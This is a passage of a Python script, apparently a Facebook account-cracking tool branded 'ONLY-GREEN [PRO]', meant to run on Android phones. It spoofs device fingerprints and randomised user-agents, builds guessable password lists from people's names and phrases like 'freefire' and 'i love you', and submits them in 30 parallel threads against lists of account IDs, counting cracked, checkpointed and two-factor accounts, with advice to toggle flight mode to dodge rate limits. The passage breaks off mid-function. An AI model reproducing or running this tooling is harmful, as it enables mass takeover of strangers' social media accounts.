Safari/600.7','Mozilla/5.0 (Windows; U; Windows NT 10.0; Win64; x64) AppleWebKit/603.30 (KHTML, like Gecko) Chrome/54.0.3156.382 Safari/603.6 Edge/18.79399','Mozilla/5.0 (Windows NT 10.4; x64) Gecko/20100101 Firefox/66.4','Mozilla/5.0 (Linux; Android 6.0.1; HTC Onemini 2 Build/MRA58K) AppleWebKit/533.36 (KHTML, like Gecko)  Chrome/47.0.1790.136 Mobile Safari/535.3','Mozilla/5.0 (compatible; MSIE 7.0; Windows; Windows NT 6.0; WOW64 Trident/4.0)','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/600.43 (KHTML, like Gecko) Chrome/48.0.3342.291 Safari/535','Mozilla/5.0 (Windows; Windows NT 6.1;) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/53.0.1330.259 Safari/536','Mozilla/5.0 (Android; Android 5.1.1; MOTOROLA MOTO XT1570 MOTO X STYLE Build/LPD23) AppleWebKit/535.38 (KHTML, like Gecko)  Chrome/47.0.3904.299 Mobile Safari/537.6','Mozilla/5.0 (Linux x86_64) Gecko/20100101 Firefox/74.6','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/601.46 (KHTML, like Gecko) Chrome/52.0.2728.290 Safari/603','Mozilla/5.0 (iPhone; CPU iPhone OS 10_5_5; like Mac OS X) AppleWebKit/534.40 (KHTML, like Gecko)  Chrome/47.0.3600.136 Mobile Safari/537.6','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 9_6_3; en-US) AppleWebKit/533.26 (KHTML, like Gecko) Chrome/50.0.1337.293 Safari/601','Mozilla/5.0 (iPhone; CPU iPhone OS 11_7_7; like Mac OS X) AppleWebKit/537.33 (KHTML, like Gecko)  Chrome/52.0.3317.198 Mobile Safari/536.7','Mozilla/5.0 (Linux i576 ; en-US) Gecko/20130401 Firefox/53.9','Mozilla/5.0 (Windows; Windows NT 10.3;) AppleWebKit/602.18 (KHTML, like Gecko) Chrome/49.0.1202.394 Safari/537','Mozilla/5.0 (iPhone; CPU iPhone OS 10_5_6; like Mac OS X) AppleWebKit/534.13 (KHTML, like Gecko)  Chrome/49.0.3343.383 Mobile Safari/601.4','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 9_4_8; en-US) Gecko/20100101 Firefox/73.7','Mozilla/5.0 (iPhone; CPU iPhone OS 10_8_5; like Mac OS X) AppleWebKit/536.39 (KHTML, like Gecko)  Chrome/51.0.1931.226 Mobile Safari/537.1','Mozilla/5.0 (Macintosh; Intel Mac OS X 7_9_7) Gecko/20130401 Firefox/49.0','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 8_2_5; en-US) AppleWebKit/534.5 (KHTML, like Gecko) Chrome/49.0.1986.156 Safari/600','Mozilla/5.0 (iPhone; CPU iPhone OS 7_3_4; like Mac OS X) AppleWebKit/600.2 (KHTML, like Gecko)  Chrome/55.0.1103.344 Mobile Safari/600.0','Mozilla/5.0 (Linux; U; Android 4.4; HTC OneS dual sim Build/KOT49H) AppleWebKit/537.50 (KHTML, like Gecko)  Chrome/51.0.3108.192 Mobile Safari/600.5','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_1_2; en-US) Gecko/20100101 Firefox/66.7','Mozilla/5.0 (iPhone; CPU iPhone OS 7_5_7; like Mac OS X) AppleWebKit/603.29 (KHTML, like Gecko)  Chrome/48.0.1363.255 Mobile Safari/533.2','Mozilla/5.0 (Windows; U; Windows NT 10.0;; en-US) AppleWebKit/537.33 (KHTML, like Gecko) Chrome/51.0.3235.302 Safari/536.6 Edge/9.60855','Mozilla/5.0 (iPhone; CPU iPhone OS 10_9_5; like Mac OS X) AppleWebKit/536.38 (KHTML, like Gecko)  Chrome/48.0.1199.307 Mobile Safari/602.7','Mozilla/5.0 (iPhone; CPU iPhone OS 11_5_2; like Mac OS X) AppleWebKit/534.3 (KHTML, like Gecko)  Chrome/52.0.3181.240 Mobile Safari/534.0','Mozilla/5.0 (Linux; Android 6.0; HTC One M8 Build/MRA58K) AppleWebKit/601.15 (KHTML, like Gecko)  Chrome/52.0.2143.287 Mobile Safari/537.7','Mozilla/5.0 (Android; Android 6.0.1; HTC One_M9 Build/MRA58K) AppleWebKit/535.34 (KHTML, like Gecko)  Chrome/47.0.3634.161 Mobile Safari/534.7','Mozilla/5.0 (Linux; U; Linux x86_64) AppleWebKit/603.31 (KHTML, like Gecko) Chrome/54.0.3672.335 Safari/601','Mozilla/5.0 (Linux; U; Android 4.4; Nexus_S_4G Build/GRJ22) AppleWebKit/601.23 (KHTML, like Gecko)  Chrome/47.0.2402.193 Mobile Safari/534.5','Mozilla/5.0 (iPhone; CPU iPhone OS 11_9_6; like Mac OS X) AppleWebKit/537.30 (KHTML, like Gecko)  Chrome/54.0.3774.249 Mobile Safari/603.3','Mozilla/5.0 (Windows NT 6.1;; en-US) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/47.0.1425.356 Safari/602.0 Edge/16.97328','Mozilla/5.0 (Linux; U; Linux i665 ; en-US) AppleWebKit/537.10 (KHTML, like Gecko) Chrome/49.0.2914.282 Safari/535','Mozilla/5.0 (Windows NT 10.2;; en-US) AppleWebKit/601.2 (KHTML, like Gecko) Chrome/53.0.1289.358 Safari/602.0 Edge/18.21806','Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_6; like Mac OS X) AppleWebKit/603.12 (KHTML, like Gecko)  Chrome/52.0.1697.120 Mobile Safari/534.6','Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_9; like Mac OS X) AppleWebKit/536.31 (KHTML, like Gecko)  Chrome/48.0.3535.236 Mobile Safari/533.8','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 9_3_5) AppleWebKit/600.35 (KHTML, like Gecko) Chrome/48.0.3896.102 Safari/602','Mozilla/5.0 (iPod; CPU iPod OS 8_0_4; like Mac OS X) AppleWebKit/533.42 (KHTML, like Gecko)  Chrome/48.0.3495.315 Mobile Safari/602.4','Mozilla/5.0 (Windows NT 10.4; x64; en-US) Gecko/20130401 Firefox/52.2','Mozilla/5.0 (Macintosh; Intel Mac OS X 7_4_8) Gecko/20100101 Firefox/48.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_5_6; en-US) Gecko/20100101 Firefox/72.9','Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1;; en-US Trident/4.0)','Mozilla/5.0 (Windows; U; Windows NT 10.1;) AppleWebKit/537.3 (KHTML, like Gecko) Chrome/49.0.3104.216 Safari/601.4 Edge/18.69661','Mozilla/5.0 (iPhone; CPU iPhone OS 8_5_1; like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko)  Chrome/53.0.1007.213 Mobile Safari/602.1','Mozilla/5.0 (Windows; U; Windows NT 6.0;) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/49.0.3213.309 Safari/602','Mozilla/5.0 (Android; Android 5.1; Nexus 6 Build/LMY48B) AppleWebKit/536.27 (KHTML, like Gecko)  Chrome/55.0.3227.149 Mobile Safari/536.8','Mozilla/5.0 (Windows; U; Windows NT 10.0; Win64; x64) AppleWebKit/534.31 (KHTML, like Gecko) Chrome/53.0.2411.260 Safari/534','Mozilla/5.0 (Macintosh; Intel Mac OS X 8_4_6; en-US) Gecko/20100101 Firefox/45.8','Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_4; like Mac OS X) AppleWebKit/602.38 (KHTML, like Gecko)  Chrome/50.0.2401.327 Mobile Safari/537.6','Mozilla/5.0 (Linux i556 ; en-US) AppleWebKit/600.28 (KHTML, like Gecko) Chrome/54.0.3335.310 Safari/600','Mozilla/5.0 (Windows; U; Windows NT 10.4; x64; en-US) AppleWebKit/600.23 (KHTML, like Gecko) Chrome/49.0.3907.122 Safari/600.0 Edge/14.78932','Mozilla/5.0 (Windows NT 6.3; WOW64; en-US) Gecko/20130401 Firefox/63.3','Mozilla/5.0 (Linux x86_64; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/48.0.3712.304 Safari/601','Mozilla/5.0 (Windows; Windows NT 10.2; x64) AppleWebKit/600.37 (KHTML, like Gecko) Chrome/50.0.1686.135 Safari/600.7 Edge/11.46163','Mozilla/5.0 (Macintosh; Intel Mac OS X 7_6_9) Gecko/20130401 Firefox/57.5','Mozilla/5.0 (Linux; U; Linux x86_64) Gecko/20100101 Firefox/67.1','Mozilla/5.0 (Windows; Windows NT 6.3; WOW64; en-US) Gecko/20130401 Firefox/57.4','Mozilla/5.0 (iPhone; CPU iPhone OS 11_0_4; like Mac OS X) AppleWebKit/602.49 (KHTML, like Gecko)  Chrome/55.0.3746.110 Mobile Safari/602.6','Mozilla/5.0 (Android; Android 6.0.1; HTC One_M9 Build/MRA58K) AppleWebKit/603.7 (KHTML, like Gecko)  Chrome/50.0.1781.250 Mobile Safari/534.1','Mozilla/5.0 (Linux; Android 6.0.1; HTC Onemini 2 dual sim Build/MRA58K) AppleWebKit/537.46 (KHTML, like Gecko)  Chrome/55.0.1462.229 Mobile Safari/533.8','Mozilla/5.0 (Android; Android 4.4.1; [HM NOTE|NOTE-III|NOTE2 1LTET) AppleWebKit/602.44 (KHTML, like Gecko)  Chrome/53.0.2720.202 Mobile Safari/536.7','Mozilla/5.0 (U; Linux i662 x86_64) Gecko/20130401 Firefox/54.9','Mozilla/5.0 (Macintosh; Intel Mac OS X 9_8_8; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/49.0.3776.150 Safari/600','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_0_8) Gecko/20100101 Firefox/46.4','Mozilla/5.0 (Windows NT 6.1; WOW64; en-US) AppleWebKit/601.48 (KHTML, like Gecko) Chrome/54.0.1395.144 Safari/535','Mozilla/5.0 (Windows; Windows NT 10.5; WOW64) AppleWebKit/537.27 (KHTML, like Gecko) Chrome/54.0.1015.303 Safari/537.5 Edge/11.65472','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 7_1_6; en-US) Gecko/20100101 Firefox/59.2','Mozilla/5.0 (Linux; U; Linux i685 x86_64) AppleWebKit/535.31 (KHTML, like Gecko) Chrome/47.0.3795.166 Safari/533','Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_1; like Mac OS X) AppleWebKit/600.30 (KHTML, like Gecko)  Chrome/51.0.1459.192 Mobile Safari/534.2','Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; x64 Trident/4.0)','Mozilla/5.0 (Linux; U; Android 5.1; MOTO X PLAY XT1562 Build/LMY47Z) AppleWebKit/601.11 (KHTML, like Gecko)  Chrome/53.0.2788.302 Mobile Safari/537.7','Mozilla/5.0 (Linux; U; Linux x86_64) Gecko/20130401 Firefox/59.5','Mozilla/5.0 (Linux x86_64) Gecko/20100101 Firefox/65.8','Mozilla/5.0 (Linux x86_64; en-US) AppleWebKit/536.8 (KHTML, like Gecko) Chrome/47.0.1268.266 Safari/537','Mozilla/5.0 (Windows; U; Windows NT 10.3; x64) AppleWebKit/602.8 (KHTML, like Gecko) Chrome/48.0.3018.361 Safari/601','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 8_3_0; en-US) AppleWebKit/601.23 (KHTML, like Gecko) Chrome/54.0.3962.391 Safari/603','Mozilla/5.0 (Linux i653 ; en-US) Gecko/20130401 Firefox/58.5','Mozilla/5.0 (compatible; MSIE 11.0; Windows; U; Windows NT 6.1; WOW64; en-US Trident/7.0)','Mozilla/5.0 (U; Linux i586 x86_64; en-US) Gecko/20130401 Firefox/59.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.5 (KHTML, like Gecko) Chrome/54.0.3106.370 Safari/603','Mozilla/5.0 (compatible; MSIE 10.0; Windows; Windows NT 6.2; WOW64; en-US Trident/6.0)','Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_9; like Mac OS X) AppleWebKit/601.25 (KHTML, like Gecko)  Chrome/50.0.1976.259 Mobile Safari/533.9','Mozilla/5.0 (Linux x86_64; en-US) Gecko/20130401 Firefox/50.3','Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2; like Mac OS X) AppleWebKit/603.23 (KHTML, like Gecko)  Chrome/49.0.2628.225 Mobile Safari/536.9','Mozilla/5.0 (Windows; U; Windows NT 6.0; WOW64; en-US) AppleWebKit/537.46 (KHTML, like Gecko) Chrome/50.0.2745.187 Safari/533','Mozilla/5.0 (Windows NT 6.1; Win64; x64) Gecko/20130401 Firefox/45.9','Mozilla/5.0 (Windows NT 10.1; WOW64) AppleWebKit/602.28 (KHTML, like Gecko) Chrome/51.0.2185.366 Safari/536.1 Edge/15.58943','Mozilla/5.0 (iPod; CPU iPod OS 11_9_2; like Mac OS X) AppleWebKit/537.5 (KHTML, like Gecko)  Chrome/52.0.1532.223 Mobile Safari/600.7','Mozilla/5.0 (Macintosh; Intel Mac OS X 7_0_7) Gecko/20130401 Firefox/71.6','Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; en-US Trident/4.0)','Mozilla/5.0 (Linux; U; Android 6.0; Nexus 5X Build/MMB29V) AppleWebKit/603.45 (KHTML, like Gecko)  Chrome/47.0.3847.162 Mobile Safari/600.2','Mozilla/5.0 (Android; Android 4.4.1; LG Optimus G Build/KRT16M) AppleWebKit/535.25 (KHTML, like Gecko)  Chrome/55.0.2453.103 Mobile Safari/602.6','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_7; en-US) Gecko/20100101 Firefox/61.9','Mozilla/5.0 (Android; Android 6.0; HTC One0P8B2 dual sim Build/MRA58K) AppleWebKit/535.17 (KHTML, like Gecko)  Chrome/51.0.1232.382 Mobile Safari/602.6','Mozilla/5.0 (Linux; U; Linux i642 ; en-US) Gecko/20100101 Firefox/54.5','Mozilla/5.0 (Windows; U; Windows NT 10.4; x64; en-US) AppleWebKit/602.18 (KHTML, like Gecko) Chrome/55.0.3603.209 Safari/600.4 Edge/12.53761','Mozilla/5.0 (U; Linux x86_64) Gecko/20130401 Firefox/57.7','Mozilla/5.0 (Linux; Linux i683 ) AppleWebKit/533.43 (KHTML, like Gecko) Chrome/54.0.1267.236 Safari/603','Mozilla/5.0 (Android; Android 5.1; MOTOROLA MOTO XT1562 Build/LPK23) AppleWebKit/535.9 (KHTML, like Gecko)  Chrome/50.0.3424.148 Mobile Safari/534.4','Mozilla/5.0 (Macintosh; Intel Mac OS X 7_7_7) Gecko/20130401 Firefox/60.5','Mozilla/5.0 (Android; Android 7.1; LG-H900 Build/NRD90M) AppleWebKit/601.10 (KHTML, like Gecko)  Chrome/47.0.3037.396 Mobile Safari/534.5','Mozilla/5.0 (Windows; Windows NT 10.5;) AppleWebKit/534.41 (KHTML, like Gecko) Chrome/53.0.3077.208 Safari/535.4 Edge/13.73115','Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_3; like Mac OS X) AppleWebKit/534.30 (KHTML, like Gecko)  Chrome/49.0.3562.212 Mobile Safari/602.0','Mozilla/5.0 (Linux; Linux x86_64) Gecko/20130401 Firefox/60.0','Mozilla/5.0 (Windows; Windows NT 10.5; x64; en-US) AppleWebKit/601.43 (KHTML, like Gecko) Chrome/53.0.3626.387 Safari/603.9 Edge/9.12840','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_12_0) Gecko/20130401 Firefox/48.8','Mozilla/5.0 (Windows NT 10.2; x64) AppleWebKit/601.28 (KHTML, like Gecko) Chrome/53.0.2427.175 Safari/603','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_4_1) Gecko/20100101 Firefox/65.6','Mozilla/5.0 (Windows; U; Windows NT 10.5; WOW64; en-US) AppleWebKit/603.5 (KHTML, like Gecko) Chrome/50.0.2349.142 Safari/600.8 Edge/14.50148','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 8_8_8) Gecko/20100101 Firefox/58.9','Mozilla/5.0 (Linux; U; Android 4.3.1; Nokia 3110 Build/IMM76D) AppleWebKit/603.6 (KHTML, like Gecko)  Chrome/53.0.3827.142 Mobile Safari/603.1','Mozilla/5.0 (Windows; Windows NT 10.0; Win64; x64) Gecko/20130401 Firefox/56.4','Mozilla/5.0 (Android; Android 4.4.4; SAMSUNG SM-G900W8 Build/KOT49H) AppleWebKit/600.18 (KHTML, like Gecko)  Chrome/51.0.3586.324 Mobile Safari/600.2','Mozilla/5.0 (Linux; Android 5.1; Nexus 5 Build/LRX22C) AppleWebKit/533.43 (KHTML, like Gecko)  Chrome/54.0.3773.110 Mobile Safari/533.9','Mozilla/5.0 (Linux; Android 7.1.1; Xperia Build/NDE63X) AppleWebKit/536.47 (KHTML, like Gecko)  Chrome/47.0.1716.358 Mobile Safari/603.1','Mozilla/5.0 (Android; Android 5.1.1; MOTO X PURE XT1575 Build/LMY47Z) AppleWebKit/601.5 (KHTML, like Gecko)  Chrome/53.0.2725.394 Mobile Safari/600.8','Mozilla/5.0 (Linux; U; Android 5.1.1; SM-G9350H Build/MMB29M) AppleWebKit/603.27 (KHTML, like Gecko)  Chrome/48.0.1082.363 Mobile Safari/601.4','Mozilla/5.0 (Macintosh; Intel Mac OS X 9_8_8) Gecko/20100101 Firefox/65.9','Mozilla/5.0 (Linux; U; Linux x86_64) Gecko/20100101 Firefox/56.0','Mozilla/5.0 (Linux; Android 5.0; SM-G420 Build/LRX22G) AppleWebKit/536.43 (KHTML, like Gecko)  Chrome/49.0.1471.154 Mobile Safari/533.8','Mozilla/5.0 (Windows; U; Windows NT 6.0; Win64; x64; en-US) AppleWebKit/601.7 (KHTML, like Gecko) Chrome/48.0.2727.398 Safari/533','Mozilla/5.0 (Macintosh; Intel Mac OS X 7_3_5; en-US) Gecko/20130401 Firefox/59.7','Mozilla/5.0 (Linux; U; Android 7.1; Xperia V Build/NDE63X) AppleWebKit/603.29 (KHTML, like Gecko)  Chrome/50.0.3367.224 Mobile Safari/601.8','Mozilla/5.0 (Linux; Android 6.0; SM-G928M Build/MMB29K) AppleWebKit/533.2 (KHTML, like Gecko)  Chrome/55.0.2957.150 Mobile Safari/601.7','Mozilla/5.0 (Windows; Windows NT 6.1; x64) Gecko/20130401 Firefox/64.1','Mozilla/5.0 (Linux; U; Linux i544 ; en-US) Gecko/20100101 Firefox/65.9','Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SM-T800 Build/LRX22G) AppleWebKit/602.40 (KHTML, like Gecko)  Chrome/51.0.3452.330 Mobile Safari/537.9','Mozilla/5.0 (Linux; U; Linux i550 ; en-US) Gecko/20100101 Firefox/49.8','Mozilla/5.0 (Windows; U; Windows NT 10.5; Win64; x64; en-US) AppleWebKit/537.10 (KHTML, like Gecko) Chrome/55.0.3482.140 Safari/602.6 Edge/16.28993','Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.5; Trident/6.0)','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 8_7_9) Gecko/20100101 Firefox/67.0','Mozilla/5.0 (Windows NT 10.5; x64; en-US) AppleWebKit/601.38 (KHTML, like Gecko) Chrome/52.0.1117.303 Safari/600.9 Edge/15.97302','Mozilla/5.0 (compatible; MSIE 7.0; Windows; Windows NT 6.0; WOW64 Trident/4.0)','Mozilla/5.0 (compatible; MSIE 10.0; Windows; U; Windows NT 6.0; WOW64 Trident/6.0)','Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; x64 Trident/4.0)','Mozilla/5.0 (Windows NT 10.4;) AppleWebKit/534.15 (KHTML, like Gecko) Chrome/55.0.1497.186 Safari/535.8 Edge/9.16146','Mozilla/5.0 (Windows; Windows NT 10.2;) AppleWebKit/600.28 (KHTML, like Gecko) Chrome/48.0.3860.114 Safari/536.7 Edge/16.62349','Mozilla/5.0 (iPhone; CPU iPhone OS 9_0_3; like Mac OS X) AppleWebKit/536.37 (KHTML, like Gecko)  Chrome/48.0.2113.364 Mobile Safari/536.9','Mozilla/5.0 (Macintosh; Intel Mac OS X 9_1_8) AppleWebKit/537.42 (KHTML, like Gecko) Chrome/50.0.3306.169 Safari/601','Mozilla/5.0 (iPod; CPU iPod OS 8_3_0; like Mac OS X) AppleWebKit/535.11 (KHTML, like Gecko)  Chrome/49.0.1473.326 Mobile Safari/600.7','Mozilla/5.0 (Linux; Android 7.1.1; Xperia V Build/NDE63X) AppleWebKit/603.32 (KHTML, like Gecko)  Chrome/49.0.1553.279 Mobile Safari/602.5','Mozilla/5.0 (Windows NT 10.1;) AppleWebKit/536.23 (KHTML, like Gecko) Chrome/55.0.1362.387 Safari/536.4 Edge/12.77766','Mozilla/5.0 (iPhone; CPU iPhone OS 9_0_9; like Mac OS X) AppleWebKit/600.30 (KHTML, like Gecko)  Chrome/54.0.1825.184 Mobile Safari/535.5','Mozilla/5.0 (compatible; MSIE 11.0; Windows; Windows NT 6.3; Win64; x64; en-US Trident/7.0)','Mozilla/5.0 (Windows; U; Windows NT 6.0; x64; en-US) AppleWebKit/601.16 (KHTML, like Gecko) Chrome/52.0.3255.181 Safari/534','Mozilla/5.0 (Windows; U; Windows NT 10.1; Win64; x64; en-US) AppleWebKit/537.18 (KHTML, like Gecko) Chrome/51.0.2271.150 Safari/535.0 Edge/10.17682','Mozilla/5.0 (Windows NT 10.0; WOW64) Gecko/20100101 Firefox/47.4','Mozilla/5.0 (Linux; U; Android 5.0.2; LG-D333 Build/LRX22G) AppleWebKit/603.19 (KHTML, like Gecko)  Chrome/55.0.3974.301 Mobile Safari/536.2','Mozilla/5.0 (Linux; U; Android 7.0; Nexus 5X Build/NPD90G) AppleWebKit/534.20 (KHTML, like Gecko)  Chrome/50.0.3425.351 Mobile Safari/601.4'])
ugen = []
for agent in range(10000):
    aa = 'Mozilla/5.0 (Linux; Android 6.0.1;'
    b = random.choice(['6', '7', '8', '9', '10', '11', '12'])
    c = 'en-us; 10; T-Mobile myTouch 3G Slide Build/'
    d = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K',
                      'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e = random.randrange(1, 999)
    f = random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K',
                      'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/533.1'
    fullagnt = (f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(fullagnt)
sim_id = ''
android_version = subprocess.check_output(
    'getprop ro.build.version.release', shell=True).decode('utf-8').replace('\n', '')
model = subprocess.check_output(
    'getprop ro.product.model', shell=True).decode('utf-8').replace('\n', '')
build = subprocess.check_output(
    'getprop ro.build.id', shell=True).decode('utf-8').replace('\n', '')
fblc = 'en_GB'
try:
    fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode(
        'utf-8').split(',')[0].replace('\n', '')
except:
    fbcr = 'Zong'
fbmf = subprocess.check_output(
    'getprop ro.product.manufacturer', shell=True).decode('utf-8').replace('\n', '')
fbbd = subprocess.check_output(
    'getprop ro.product.brand', shell=True).decode('utf-8').replace('\n', '')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist', shell=True).decode(
    'utf-8').replace(',', ':').replace('\n', '')
fbdm = '{density=2.25,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height', shell=True).decode('utf-8').replace(
    '\n', '')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width', shell=True).decode('utf-8').replace('\n', '')
try:
    fbcr = subprocess.check_output(
        'getprop gsm.operator.alpha', shell=True).decode('utf-8').split(',')
    total = 0
    for i in fbcr:
        total += 1
    select = ('1', '2')
    if select == '1':
        fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode(
            'utf-8').split(',')[0].replace('\n', '')
        sim_id += fbcr
    elif select == '2':
        try:
            fbcr = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode(
                'utf-8').split(',')[1].replace('\n', '')
            sim_id += fbcr
        except Exception as e:
            fbcr = "Zong"
            sim_id += fbcr
    else:
        fbcr = 'Zong'
        sim_id += fbcr
except:
    fbcr = "Zong"
device = {
    'android_version': android_version,
    'model': model,
    'build': build,
    'fblc': fblc,
    'fbmf': fbmf,
    'fbbd': fbbd,
    'fbdv': model,
    'fbsv': fbsv,
    'fbca': fbca,
    'fbdm': fbdm}
logo = ("""\033[1;32m              
██████╗░░█████╗░██████╗░██╗░░██╗  ███████╗
██╔══██╗██╔══██╗██╔══██╗██║░██╔╝  ╚════██║
██║░░██║███████║██████╔╝█████═╝░  ░░███╔═╝
██║░░██║██╔══██║██╔══██╗██╔═██╗░  ██╔══╝░░
██████╔╝██║░░██║██║░░██║██║░╚██╗  ███████╗
╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝  ╚══════╝
\033[1;33m----------------------------------------------
 \033[1;37m[👨] Author    :  Dark X FUZED
 \033[1;37m[📖] Github    :  https://github.com/coderet-d-looper
 \033[1;37m[☎️] Whatsapp   :  +8801576593082
 \033[1;37m[💉] Tool      :  ONLY-GREEN [PRO]
 \033[1;37m[📅] Version   :  3.5 [DEXA-E]
 \033[1;37m[🚀] Status    :  Trial
 \033[1;37m[⏳] Update    :  Daily at 12:00AM
 \033[1;33m----------------------------------------------
 \033[1;31m[😀]WORKING ONLY ON MOBILE DATA[✅]
\033[1;33m----------------------------------------------""")


def linex():
    print('\033[1;37m----------------------------------------------')


def clear():
    os.system('clear')
    print(logo)


loop = 0
oks = []
cps = []
twf = []
pcp = []
id = []
tokenku = []


def menu():
    try:
        clear()
        os.system(' xdg-open https://www.github.com/coderet-d-looper')
        if 1 == 1:
            clear()
            print('\033[1;37m[1️⃣] File cloning\n\033[1;37m[2️⃣] Random Cloning\n\033[1;37m[3️⃣] VISIT MY ACCOUNT\n\033[1;37m[4️⃣] Close Tool')
            linex()
            xd = input('\033[1;37m[?] Choice : ')
            if xd in ['1', '01']:
                os.system(
                    ' xdg-open https://m.facebook.com/groups/2477016825771219/?ref=share&mibextid=NSMWBT')
                clear()
                file = input('\033[1;37m[📂] Enter File Path: ')
                try:
                    fo = open(file, 'r').read().splitlines()
                except FileNotFoundError:
                    print('[❌] File location not found [❌]')
                    time.sleep(1)
                    menu()
                clear()
                print('\033[1;32m[1] Method 1 [Best Working]\n[2] Method 2')
                linex()
                mthd = input('\033[1;32m[?] Choose : ')
                linex()
                plist = []
                print('\033[1;37m           Select Password Crack menu')
                linex()
                print(
                    '[1] Crack with auto password [Best Working]\n[2] Crack with choice password')
                linex()
                ppp = input('\033[1;32m[?] Choose : ')
                if ppp in ['1', '01']:
                    plist.append('first last')
                    plist.append('first')
                    plist.append('firstlast')
                    plist.append('first123')
                    plist.append('first1234')
                    plist.append('first12345')
                    plist.append('first123456')
                    plist.append('first1122')
                    plist.append('first@@')
                    plist.append('first@@@')
                    plist.append('first@@@@')
                    plist.append('first12')
                    plist.append('first111')
                    plist.append('first11')
                    plist.append('i love you')
                    plist.append('freefire')
                    plist.append('FREEFIRE')
                    plist.append('free fire')
                    plist.append('FREE FIRE')
                    plist.append('freefire1234')
                else:
                    try:
                        linex()
                        ps_limit = int(
                            input(' How many passwords do you want to add ? '))
                    except:
                        ps_limit = 15
                    linex()
                    print('\033[1;32m example: first last,firtslast,first123')
                    linex()
                    for i in range(ps_limit):
                        plist.append(
                            input(f'\033[1;32m[+] Put password {i+1}: '))
                linex()
                print('[🍬]Do you went show cp account? (Y/n): ')
                linex()
                cx = input(' Choose: ')
                if cx in ['y', 'Y', 'yes', 'Yes', '1']:
                    pcp.append('y')
                else:
                    pcp.append('n')
                with tred(max_workers=30) as crack_submit:
                    clear()
                    total_ids = str(len(fo))
                    print('[🧮]Total ids : \033[1;32m'+total_ids)
                    print("\033[1;35m[🚄]Cracking speed - FAST ")
                    print("\033[1;33m[🔍]Cracking has been started")
                    linex()
                    print(f'\033[1;31m[✈️]USE FLIGHT MODE IN EVERY 5 MIN')
                    linex()
                    for user in fo:
                        ids, names = user.split('|')
                        passlist = plist
                        if mthd in ['1', '01']:
                            crack_submit.submit(ffb, ids, names, passlist)
                        elif mthd in ['2', '02']:
                            crack_submit.submit(api, ids, names, passlist)
                        else:
                            crack_submit.submit(api1, ids, names, passlist)
                print('\033[1;37m')
                linex()
                print('[😘]The process has completed')
                print('[🔰]Total OK/CP/2F: '+str(len(oks)) +
                      '/'+str(len(cps))+'/'+str(len(twf)))
                linex()
                input('[👉]Press enter to back[👈]')
                os.system('python Dark.py')
            elif xd in ['3', '03']:
                os.system(' xdg-open https://www.facebook.com/coderet.d.looper')
                menu()
            elif xd in ['4', '04']:
                exit('BYE BYE Tata Gaya')
            elif xd in ['2', '02']:
                clear()
                print(
                    ' [1]Pakistan cloning\n [2] Bangladesh cloning\n [3] Indonesia Cloning\n [4] Gmail cloning\n [0] Back menu')
                linex()
                x = input(' Choose: ')
                if x in ['1', '01']:
                    pak()
                elif x in ['2', '02']:
                    bd()
                elif x in ['3', '03']:
                    indo()
                elif x in ['4', '04']:
                    gmail()
                else:
                    menu()
            elif xd in ['5', '05']:
                gmail()
            else:
                exit(' Option not found in menu...')
        else:
            print(' Run :  python Dark.py')
            linex()
            exit()
    except ValueError:
        exit()
    except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()


def pak():
    user = []
    clear()
    print('\033[1;31m Code example: 0306,0315,0335,0345')
    code = input('\033[1;37m put code: ')
    try:
        limit = int(
